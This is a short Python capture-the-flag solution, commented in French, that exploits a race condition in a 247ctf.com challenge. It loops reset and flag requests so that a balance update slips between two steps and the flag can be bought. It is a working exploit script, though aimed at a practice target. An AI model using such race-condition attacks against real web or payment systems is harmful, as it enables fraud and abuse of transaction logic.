#!/usr/bin/python3

# On transfère de manière répétée 10 balles de 1 à 2 et réciproquement.
# Comme l'update des sous de 1 et de 2 se fait à deux moments différents,
# il doit être possible de glisser entre les deux un reset qui remet 1 à 247,
# avant de recevoir 10 de 2, passant à 257, et pouvant ainsi acheter le flag ;-)

import requests

s = requests.Session()
host = "https://c11342ea493e12d4.247ctf.com/"

while True :
    reset = s.get(host + "/?reset")
    flag = s.get(host + "/?flag&from=1")
    if "247CTF" in flag.text :
        print(flag.text)
        exit()
